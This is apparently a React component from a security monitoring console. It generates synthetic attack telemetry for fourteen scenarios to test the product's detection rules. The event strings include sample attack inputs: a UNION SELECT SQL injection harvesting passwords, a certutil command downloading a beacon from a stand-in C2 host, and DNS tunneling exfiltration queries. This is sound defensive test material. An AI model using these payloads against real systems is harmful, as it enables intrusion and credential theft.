import React, { useState } from "react";
import {
  X,
  Play,
  ShieldAlert,
  Flame,
  Globe,
  Terminal,
  FileCode,
  Radio,
  Bug,
  BrainCircuit,
  CheckCircle2,
  AlertTriangle,
  Loader2,
  ArrowRight,
  Network,
  Crosshair,
  FileCheck,
  Cloud,
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import { eventsApi } from "../services/api";
import { useToast } from "../context/ToastContext";
import type { SingleIngestRequest } from "../types";

export interface SimulationScenario {
  id: string;
  name: string;
  mitreId: string;
  ruleId: string;
  tactic: string;
  severity: "critical" | "high" | "medium";
  description: string;
  icon: React.ElementType;
  targetHost: string;
  targetIp: string;
  attackerIp: string;
  generateEvents: () => SingleIngestRequest[];
}

const SCENARIOS: SimulationScenario[] = [
  {
    id: "ssh-bruteforce",
    name: "SSH Brute-Force Credential Stuffing",
    mitreId: "T1110.001",
    ruleId: "RULE-AUTH-001",
    tactic: "Credential Access",
    severity: "high",
    description:
      "Emits 6 rapid failed authentication attempts over SSH targeting the production application host within a 15-second window.",
    icon: Terminal,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "198.51.100.55",
    generateEvents: () => {
      const now = new Date();
      return Array.from({ length: 6 }, (_, i) => ({
        source_ip: "198.51.100.55",
        destination_ip: "192.168.1.10",
        destination_port: 22,
        source_port: 45000 + i,
        event_type: "auth_failed",
        target_host: "server-prod-01",
        event_time: new Date(now.getTime() - (5 - i) * 2000).toISOString(),
        raw_payload: `Failed password for invalid user admin_${i} from 198.51.100.55 port ${45000 + i} ssh2`,
        details: { user: `admin_${i}`, reason: "bad_password", service: "sshd", attempt: i + 1 },
      }));
    },
  },
  {
    id: "port-sweep",
    name: "TCP SYN Reconnaissance Port Sweep",
    mitreId: "T1046",
    ruleId: "RULE-NET-001",
    tactic: "Discovery",
    severity: "medium",
    description:
      "Simulates an adversary scanning 15 distinct service ports on the production database cluster in rapid succession.",
    icon: Radio,
    targetHost: "db-prod-01",
    targetIp: "192.168.1.20",
    attackerIp: "198.51.100.99",
    generateEvents: () => {
      const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 5432];
      const now = new Date();
      return ports.map((port, i) => ({
        source_ip: "198.51.100.99",
        destination_ip: "192.168.1.20",
        destination_port: port,
        source_port: 50000 + i,
        event_type: "connection",
        target_host: "db-prod-01",
        event_time: new Date(now.getTime() - (15 - i) * 500).toISOString(),
        raw_payload: `TCP SYN probe 198.51.100.99 -> 192.168.1.20:${port} [SYN]`,
        details: { proto: "tcp", flag: "SYN", port },
      }));
    },
  },
  {
    id: "sqli-exploit",
    name: "SQL Injection Data Exfiltration",
    mitreId: "T1190",
    ruleId: "RULE-WEB-001",
    tactic: "Initial Access",
    severity: "high",
    description:
      "Simulates an automated UNION SELECT SQL injection attempting to harvest credentials from web application users table.",
    icon: Globe,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "198.51.100.42",
    generateEvents: () => {
      return [
        {
          source_ip: "198.51.100.42",
          destination_ip: "192.168.1.10",
          destination_port: 443,
          source_port: 58210,
          event_type: "web_request",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "GET /api/v1/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
          details: {
            uri: "/api/v1/products?id=1 UNION SELECT null,username,password FROM users--",
            method: "GET",
            status_code: 200,
          },
        },
      ];
    },
  },
  {
    id: "dns-tunneling",
    name: "High-Entropy DNS Tunneling Exfiltration",
    mitreId: "T1071.004",
    ruleId: "RULE-NET-002",
    tactic: "Command and Control",
    severity: "high",
    description:
      "Emits an encrypted base64 payload encapsulated inside recursive DNS A-record queries with Shannon entropy > 3.5.",
    icon: FileCode,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "192.168.1.155",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.155",
          destination_ip: "192.168.1.10",
          destination_port: 53,
          source_port: 54111,
          event_type: "network_finding",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "DNS Tunneling query A c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io (T1071.004)",
          details: {
            rule_id: "RULE-NET-DNS-001",
            query: "c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io",
            qtype: "A",
            entropy: 3.84,
            mitre_attack_id: "T1071.004",
          },
        },
      ];
    },
  },
  {
    id: "fim-tampering",
    name: "Critical System File Tampering (FIM)",
    mitreId: "T1565.001",
    ruleId: "RULE-EDR-001",
    tactic: "Impact",
    severity: "critical",
    description:
      "Simulates unauthorized modification of critical PAM authentication configuration and /etc/shadow file hashes.",
    icon: ShieldAlert,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "192.168.1.10",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.10",
          event_type: "endpoint_finding",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-EDR-FIM-001 File Integrity Tampering: /etc/shadow modified unexpectedly (SHA256 mismatch)",
          details: {
            rule_id: "RULE-EDR-FIM-001",
            path: "/etc/shadow",
            action: "modified",
            mitre_attack_id: "T1565.001",
            sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          },
        },
      ];
    },
  },
  {
    id: "endpoint-lolbas",
    name: "Living-off-the-Land (LOLBAS) Execution",
    mitreId: "T1059.001",
    ruleId: "RULE-EDR-002",
    tactic: "Execution",
    severity: "high",
    description:
      "Executes certutil.exe download cradle to stage remote second-stage malicious binaries while evading static filters.",
    icon: Terminal,
    targetHost: "ws-eng-100",
    targetIp: "192.168.1.100",
    attackerIp: "192.168.1.100",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.100",
          event_type: "endpoint_finding",
          target_host: "ws-eng-100",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-EDR-CRADLE-001 certutil.exe -urlcache -split -f http://c2.apt29.org/beacon.exe C:\\temp\\beacon.exe",
          details: {
            rule_id: "RULE-EDR-CRADLE-001",
            exe: "certutil.exe",
            command_line: "certutil.exe -urlcache -split -f http://c2.apt29.org/beacon.exe C:\\temp\\beacon.exe",
            mitre_attack_id: "T1059.001",
            parent_process: "powershell.exe",
          },
        },
      ];
    },
  },
  {
    id: "threat-intel-ioc",
    name: "Threat Intelligence C2 Indicator Match",
    mitreId: "T1071",
    ruleId: "RULE-TI-001",
    tactic: "Command and Control",
    severity: "high",
    description:
      "Simulates internal workstation communicating with an active APT29 C2 infrastructure IP cataloged in STIX/MISP feeds.",
    icon: Flame,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "185.220.101.5",
    generateEvents: () => {
      return [
        {
          source_ip: "185.220.101.5",
          destination_ip: "192.168.1.10",
          destination_port: 443,
          event_type: "threat_intel_match",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "Inbound communication from known malicious C2 IP 185.220.101.5 (APT29)",
          details: {
            ioc_type: "ip",
            indicator: "185.220.101.5",
            threat_actor: "APT29",
            feed: "alienvault_otx",
          },
        },
      ];
    },
  },
  {
    id: "cisa-kev-vuln",
    name: "CISA KEV Actively Exploited CVE Ingest",
    mitreId: "T1190",
    ruleId: "RULE-VULN-001",
    tactic: "Initial Access",
    severity: "critical",
    description:
      "Ingests a Trivy SBOM scan reporting CVE-2023-44487 (HTTP/2 Rapid Reset) with CVSS 9.8 and CISA KEV active status.",
    icon: Bug,
    targetHost: "db-prod-01",
    targetIp: "192.168.1.20",
    attackerIp: "192.168.1.20",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.20",
          event_type: "vulnerability_finding",
          target_host: "db-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "CVE-2023-44487 HTTP/2 Rapid Reset Attack (CISA KEV: true, CVSS: 9.8)",
          details: {
            cve_id: "CVE-2023-44487",
            cvss_score: 9.8,
            cisa_kev: true,
            package: "nghttp2",
          },
        },
      ];
    },
  },
  {
    id: "ml-ueba-outlier",
    name: "ML Behavioral Anomaly / UEBA Outlier",
    mitreId: "T1078",
    ruleId: "RULE-ML-001",
    tactic: "Defense Evasion",
    severity: "high",
    description:
      "Triggers Module X6 statistical & Isolation Forest anomaly detection on off-hours vault access with a 4.36 Z-score volume spike.",
    icon: BrainCircuit,
    targetHost: "db-prod-01",
    targetIp: "192.168.1.20",
    attackerIp: "192.168.1.100",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.100",
          destination_ip: "192.168.1.20",
          destination_port: 5432,
          event_type: "ml_anomaly",
          target_host: "db-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "Off-hours access detected at 03:15 UTC; Statistically anomalous data volume (Z-Score: 4.364); Isolation Forest outlier (0.7765)",
          details: {
            rule_id: "RULE-ML-ANOMALY",
            off_hours_access: true,
            volume_z_score: 4.364,
            isolation_forest_score: 0.7765,
            bytes_transferred: 15000000,
          },
        },
      ];
    },
  },
  {
    id: "cloud-misconfiguration",
    name: "Cloud Storage Leak & IAM Wildcard (CSPM)",
    mitreId: "T1530",
    ruleId: "RULE-CLOUD-001",
    tactic: "Exfiltration / Privilege Escalation",
    severity: "high",
    description:
      "Emits an AWS S3 bucket public access finding and IAM wildcard administrative drift detected by Module X12 CSPM.",
    icon: Cloud,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "198.51.100.88",
    generateEvents: () => {
      return [
        {
          source_ip: "198.51.100.88",
          destination_ip: "192.168.1.10",
          destination_port: 443,
          source_port: 56100,
          event_type: "cloud_misconfiguration_finding",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-CLOUD-001: Cloud Infrastructure Misconfiguration: S3 bucket s3_public_bucket financial-ledger exposed to AllUsers",
          details: {
            rule_id: "RULE-CLOUD-001",
            benchmark_control: "CIS-AWS-2.1.1",
            provider: "aws",
            mitre_attack_id: "T1530",
          },
        },
      ];
    },
  },
  {
    id: "apt-full-killchain",
    name: "Full Multi-Stage APT Intrusion Campaign",
    mitreId: "T1046 -> T1190 -> T1565.001 -> T1071.004",
    ruleId: "KILLCHAIN-APT",
    tactic: "Multi-Stage Attack Chain",
    severity: "critical",
    description:
      "Sequentially emits a complete multi-stage cyber intrusion campaign against server-prod-01: Reconnaissance (Port Scan), Initial Access (SQLi Exploit), Persistence (FIM Tampering), and C2 Exfiltration (DNS Tunneling).",
    icon: Flame,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "198.51.100.42",
    generateEvents: () => {
      const now = new Date();
      const events: SingleIngestRequest[] = [];
      // 1. Recon: Port Sweep (12 ports)
      const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 5432, 8080];
      ports.forEach((port, idx) => {
        events.push({
          source_ip: "198.51.100.42",
          destination_ip: "192.168.1.10",
          destination_port: port,
          source_port: 50000 + idx,
          event_type: "connection",
          target_host: "server-prod-01",
          event_time: new Date(now.getTime() - (30 - idx) * 1000).toISOString(),
          raw_payload: `TCP SYN probe 198.51.100.42 -> 192.168.1.10:${port} [SYN]`,
          details: { proto: "tcp", flag: "SYN", port },
        });
      });
      // 2. Initial Access: SQL Injection
      events.push({
        source_ip: "198.51.100.42",
        destination_ip: "192.168.1.10",
        destination_port: 443,
        source_port: 58210,
        event_type: "web_request",
        target_host: "server-prod-01",
        event_time: new Date(now.getTime() - 15000).toISOString(),
        raw_payload: "GET /api/v1/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
        details: {
          uri: "/api/v1/products?id=1 UNION SELECT null,username,password FROM users--",
          method: "GET",
          status_code: 200,
        },
      });
      // 3. Execution/Persistence: FIM Tampering
      events.push({
        source_ip: "192.168.1.10",
        event_type: "endpoint_finding",
        target_host: "server-prod-01",
        event_time: new Date(now.getTime() - 10000).toISOString(),
        raw_payload: "RULE-EDR-FIM-001 File Integrity Tampering: /etc/shadow modified unexpectedly (SHA256 mismatch)",
        details: {
          rule_id: "RULE-EDR-FIM-001",
          path: "/etc/shadow",
          action: "modified",
          mitre_attack_id: "T1565.001",
        },
      });
      // 4. Command & Control / Exfiltration: DNS Tunneling
      events.push({
        source_ip: "192.168.1.10",
        destination_ip: "8.8.8.8",
        destination_port: 53,
        source_port: 54111,
        event_type: "network_finding",
        target_host: "server-prod-01",
        event_time: now.toISOString(),
        raw_payload: "DNS Tunneling query A c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io (T1071.004)",
        details: {
          rule_id: "RULE-NET-DNS-001",
          query: "c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io",
          qtype: "A",
          entropy: 3.84,
          mitre_attack_id: "T1071.004",
        },
      });
      return events;
    },
  },
  {
    id: "graph-blast-radius",
    name: "Knowledge Graph Attack Path to Crown Jewel",
    mitreId: "T1021",
    ruleId: "RULE-GRAPH-001",
    tactic: "Lateral Movement",
    severity: "critical",
    description:
      "Simulates Module X8 discovery of a lateral attack path reaching Core Production Database (db-prod-01) from edge perimeter.",
    icon: Network,
    targetHost: "db-prod-01",
    targetIp: "192.168.1.20",
    attackerIp: "192.168.1.1",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.1",
          destination_ip: "192.168.1.20",
          destination_port: 5432,
          event_type: "graph_finding",
          target_host: "db-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-GRAPH-BLAST-RADIUS: Lateral path discovered exposing Crown Jewel db-prod-01 via server-prod-01",
          details: {
            rule_id: "RULE-GRAPH-BLAST-RADIUS",
            root_asset: "server-prod-01",
            target_jewel: "db-prod-01",
            crown_jewels_at_risk: 1,
            hop_count: 2,
            mitre_attack_id: "T1021",
          },
        },
      ];
    },
  },
  {
    id: "risk-escalation",
    name: "Dynamic Multi-Factor Quantitative Risk Escalation",
    mitreId: "T1190",
    ruleId: "RULE-RISK-001",
    tactic: "Initial Access / Impact",
    severity: "critical",
    description:
      "Dispatches dynamic risk escalation finding computed by Module X9 factoring critical asset multiplier (2.0x), threat velocity, and CISA KEV (Score 100/100).",
    icon: Crosshair,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "192.168.1.10",
    generateEvents: () => {
      return [
        {
          source_ip: "192.168.1.10",
          event_type: "risk_finding",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-RISK-DYNAMIC-ESCALATION: Dynamic Risk Escalation for asset server-prod-01: Score 100/100 (CRITICAL). Factors: CISA KEV; Lateral Crown Jewel Exposure",
          details: {
            rule_id: "RULE-RISK-DYNAMIC-ESCALATION",
            asset_id: "server-prod-01",
            risk_score: 100,
            risk_tier: "critical",
            mitre_attack_id: "T1190",
            factors: {
              criticality_multiplier: 1.5,
              threat_velocity: 15.0,
              exploit_factor: 25.0,
              blast_factor: 15.0,
            },
          },
        },
      ];
    },
  },
  {
    id: "forensics-triage",
    name: "Digital Forensics C2 Shell Discovery",
    mitreId: "T1059.004",
    ruleId: "RULE-FORENSICS-001",
    tactic: "Command & Control / Execution",
    severity: "critical",
    description:
      "Simulates Module X11 acquisition discovering a reverse shell process (/bin/bash -i) and active socket connecting to external C2 port 4444.",
    icon: FileCheck,
    targetHost: "server-prod-01",
    targetIp: "192.168.1.10",
    attackerIp: "198.51.100.4",
    generateEvents: () => {
      return [
        {
          source_ip: "127.0.0.1",
          destination_ip: "198.51.100.4",
          destination_port: 4444,
          source_port: 48290,
          event_type: "forensics_triage_package",
          target_host: "server-prod-01",
          event_time: new Date().toISOString(),
          raw_payload: "RULE-FORENSICS-TRIAGE-001: Forensic package acquired for server-prod-01 with reverse_shell and c2_agent connection",
          details: {
            rule_id: "RULE-FORENSICS-TRIAGE-001",
            mitre_attack_id: "T1059.004",
            suspicious_processes: 1,
            root_sha256: "0e08742a74adf6f9b8c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
          },
        },
      ];
    },
  },
];

interface SimulationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const SimulationModal: React.FC<SimulationModalProps> = ({ isOpen, onClose }) => {
  const [selectedScenario, setSelectedScenario] = useState<SimulationScenario>(SCENARIOS[0]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [executionResult, setExecutionResult] = useState<{
    ingested_count: number;
    status: string;
    scenarioName: string;
  } | null>(null);

  const { showToast } = useToast();
  const navigate = useNavigate();

  if (!isOpen) return null;

  const handleExecute = async () => {
    setIsExecuting(true);
    setExecutionResult(null);

    try {
      const events = selectedScenario.generateEvents();
      const res = await eventsApi.ingestBatch({
        events,
        target_host: selectedScenario.targetHost,
      });

      setExecutionResult({
        ingested_count: res.ingested_count,
        status: res.status,
        scenarioName: selectedScenario.name,
      });

      // Dispatch auto-refresh event across active console views
      window.dispatchEvent(new CustomEvent("sentinelx:simulation-complete", { detail: res }));

      showToast(
        `Simulation triggered: ${res.ingested_count} telemetry event(s) dispatched for ${selectedScenario.ruleId}`,
        "success"
      );
    } catch (err: any) {
      const msg = err.response?.data?.detail || "Simulation execution failed";
      showToast(msg, "error");
    } finally {
      setIsExecuting(false);
    }
  };

  const getSeverityBadge = (sev: string) => {
    switch (sev) {
      case "critical":
        return "bg-rose-950/80 text-rose-300 border-rose-800";
      case "high":
        return "bg-amber-950/80 text-amber-300 border-amber-800";
      default:
        return "bg-blue-950/80 text-blue-300 border-blue-800";
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4 backdrop-blur-sm">
      <div className="relative flex max-h-[90vh] w-full max-w-4xl flex-col rounded-xl border border-cyber-border bg-cyber-surface shadow-2xl overflow-hidden">
        {/* Modal Header */}
        <div className="flex items-center justify-between border-b border-cyber-border bg-cyber-card/80 px-6 py-4">
          <div className="flex items-center space-x-3">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-red-950/60 border border-red-800">
              <Flame className="h-5 w-5 text-red-400" />
            </div>
            <div>
              <h2 className="font-mono text-base font-bold text-white tracking-wide">
                Red Team Attack Simulator & Scenario Lab
              </h2>
              <p className="text-xs text-slate-400 font-mono">
                Dispatch realistic telemetry directly into the SentinelX Ingest & Detection Engine
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="rounded-lg p-1.5 text-slate-400 transition-colors hover:bg-cyber-surface hover:text-white"
            aria-label="Close modal"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="grid grid-cols-1 md:grid-cols-12 flex-1 overflow-hidden">
          {/* Left Column: Scenario List */}
          <div className="md:col-span-5 border-r border-cyber-border overflow-y-auto max-h-[60vh] p-3 space-y-1.5 bg-cyber-bg/50">
            <p className="px-2 py-1 text-[11px] font-mono uppercase tracking-wider text-slate-400 font-semibold">
              Available Attack Scenarios ({SCENARIOS.length})
            </p>
            {SCENARIOS.map((scenario) => {
              const Icon = scenario.icon;
              const isSelected = selectedScenario.id === scenario.id;
              return (
                <button
                  key={scenario.id}
                  onClick={() => {
                    setSelectedScenario(scenario);
                    setExecutionResult(null);
                  }}
                  className={`w-full text-left rounded-lg p-3 transition-all border ${
                    isSelected
                      ? "bg-cyber-primary/10 border-cyber-primary/40 text-white shadow-sm"
                      : "bg-cyber-card/40 border-cyber-border/40 text-slate-300 hover:bg-cyber-card hover:border-cyber-border"
                  }`}
                >
                  <div className="flex items-start space-x-3">
                    <div
                      className={`p-1.5 rounded-md mt-0.5 shrink-0 ${
                        isSelected
                          ? "bg-cyber-primary/20 text-cyber-primary"
                          : "bg-slate-800 text-slate-400"
                      }`}
                    >
                      <Icon className="h-4 w-4" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <span className="font-mono text-xs font-semibold truncate text-white">
                          {scenario.name}
                        </span>
                      </div>
                      <div className="flex items-center space-x-2 mt-1">
                        <span className="font-mono text-[10px] text-cyber-primary">
                          {scenario.ruleId}
                        </span>
                        <span className="text-slate-600 text-xs">•</span>
                        <span className="font-mono text-[10px] text-slate-400">
                          {scenario.mitreId}
                        </span>
                      </div>
                    </div>
                  </div>
                </button>
              );
            })}
          </div>

          {/* Right Column: Scenario Details & Execution Panel */}
          <div className="md:col-span-7 p-6 overflow-y-auto max-h-[60vh] flex flex-col justify-between space-y-6">
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <span
                  className={`px-2.5 py-0.5 text-xs font-mono font-medium rounded border uppercase ${getSeverityBadge(
                    selectedScenario.severity
                  )}`}
                >
                  {selectedScenario.severity} Severity
                </span>
                <span className="font-mono text-xs text-slate-400">
                  Tactic: <strong className="text-slate-200">{selectedScenario.tactic}</strong>
                </span>
              </div>

              <div>
                <h3 className="font-mono text-lg font-bold text-white">
                  {selectedScenario.name}
                </h3>
                <p className="mt-2 text-xs text-slate-300 leading-relaxed">
                  {selectedScenario.description}
                </p>
              </div>

              {/* Target & Detection Parameters Grid */}
              <div className="grid grid-cols-2 gap-3 pt-2">
                <div className="rounded-lg border border-cyber-border bg-cyber-card/60 p-3">
                  <span className="font-mono text-[10px] uppercase tracking-wider text-slate-400">
                    Target Host
                  </span>
                  <p className="font-mono text-xs font-semibold text-white mt-0.5">
                    {selectedScenario.targetHost}
                  </p>
                  <p className="font-mono text-[11px] text-slate-400">
                    ({selectedScenario.targetIp})
                  </p>
                </div>

                <div className="rounded-lg border border-cyber-border bg-cyber-card/60 p-3">
                  <span className="font-mono text-[10px] uppercase tracking-wider text-slate-400">
                    Adversary / Source
                  </span>
                  <p className="font-mono text-xs font-semibold text-rose-300 mt-0.5">
                    {selectedScenario.attackerIp}
                  </p>
                  <p className="font-mono text-[11px] text-slate-400">
                    MITRE {selectedScenario.mitreId}
                  </p>
                </div>

                <div className="rounded-lg border border-cyber-border bg-cyber-card/60 p-3">
                  <span className="font-mono text-[10px] uppercase tracking-wider text-slate-400">
                    Detection Rule
                  </span>
                  <p className="font-mono text-xs font-semibold text-cyber-primary mt-0.5">
                    {selectedScenario.ruleId}
                  </p>
                  <p className="font-mono text-[11px] text-slate-400">
                    Sliding Window Trigger
                  </p>
                </div>

                <div className="rounded-lg border border-cyber-border bg-cyber-card/60 p-3">
                  <span className="font-mono text-[10px] uppercase tracking-wider text-slate-400">
                    Batch Volume
                  </span>
                  <p className="font-mono text-xs font-semibold text-amber-300 mt-0.5">
                    {selectedScenario.generateEvents().length} Event(s)
                  </p>
                  <p className="font-mono text-[11px] text-slate-400">
                    JSON Telemetry Stream
                  </p>
                </div>
              </div>

              {/* Execution Feedback Banner */}
              {executionResult && (
                <div className="rounded-lg border border-emerald-500/40 bg-emerald-950/30 p-3 text-xs text-emerald-200 flex items-start space-x-2.5 animate-fadeIn">
                  <CheckCircle2 className="h-4 w-4 text-emerald-400 shrink-0 mt-0.5" />
                  <div className="flex-1">
                    <p className="font-semibold font-mono">
                      Simulation Successfully Ingested!
                    </p>
                    <p className="mt-0.5 text-emerald-300/80">
                      Dispatched {executionResult.ingested_count} telemetry event(s) to SentinelX. The Detection Engine has evaluated the sliding window and updated the Alerts Queue.
                    </p>
                    <div className="mt-2.5 flex items-center space-x-3">
                      <button
                        onClick={() => {
                          onClose();
                          navigate("/alerts");
                        }}
                        className="inline-flex items-center space-x-1.5 rounded bg-emerald-600/80 px-2.5 py-1 text-xs font-mono font-medium text-white hover:bg-emerald-500 transition-colors"
                      >
                        <span>View Alerts Queue</span>
                        <ArrowRight className="h-3 w-3" />
                      </button>
                      <button
                        onClick={() => {
                          onClose();
                          navigate("/incidents");
                        }}
                        className="inline-flex items-center space-x-1.5 rounded border border-emerald-600/60 px-2.5 py-1 text-xs font-mono font-medium text-emerald-200 hover:bg-emerald-900/40 transition-colors"
                      >
                        <span>View Incidents</span>
                        <ArrowRight className="h-3 w-3" />
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Action Bar */}
            <div className="flex items-center justify-between border-t border-cyber-border pt-4">
              <div className="flex items-center space-x-1.5 text-[11px] font-mono text-slate-400">
                <AlertTriangle className="h-3.5 w-3.5 text-amber-400" />
                <span>Non-destructive test telemetry</span>
              </div>
              <div className="flex items-center space-x-3">
                <button
                  onClick={onClose}
                  className="rounded-lg border border-cyber-border px-3.5 py-1.5 font-mono text-xs text-slate-300 hover:bg-cyber-card transition-colors"
                >
                  Close
                </button>
                <button
                  onClick={handleExecute}
                  disabled={isExecuting}
                  className="inline-flex items-center space-x-2 rounded-lg bg-red-600 px-4 py-2 font-mono text-xs font-semibold text-white shadow-lg shadow-red-950/50 hover:bg-red-500 disabled:opacity-50 transition-all"
                >
                  {isExecuting ? (
                    <>
                      <Loader2 className="h-3.5 w-3.5 animate-spin" />
                      <span>Dispatching...</span>
                    </>
                  ) : (
                    <>
                      <Play className="h-3.5 w-3.5 fill-current" />
                      <span>Launch Attack Simulation</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
